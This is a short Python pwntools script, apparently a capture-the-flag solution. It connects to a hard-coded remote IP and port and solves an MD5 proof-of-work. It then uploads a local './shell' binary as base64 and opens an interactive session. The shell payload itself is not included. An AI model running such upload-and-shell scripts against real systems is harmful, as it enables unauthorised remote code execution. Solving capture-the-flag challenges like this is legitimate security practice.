from pwn import *
import proofofwork

context(arch = "i386", os = "linux")
# context(arch = "amd64", os = "linux")

# context.log_level = 'debug'
# context.log_level = 'critical'

# env = {"LD_PRELOAD": "./libc.so"}

# p = process("python server.py", shell=True)
p = remote("39.105.151.182", 9999)

p.recvline()
msg = p.recvline().strip()
key_suffix = msg.split('"')[1]
hash_prefix = msg.split("=")[-1]

key = proofofwork.md5(hash_prefix + '?'*28, text='??????' + key_suffix)[:6]

p.sendline(key)

payload = open('./shell', 'rb').read()
payload_b64 = b64e(payload)

p.sendline(payload_b64)

# info("SENT")

p.interactive()

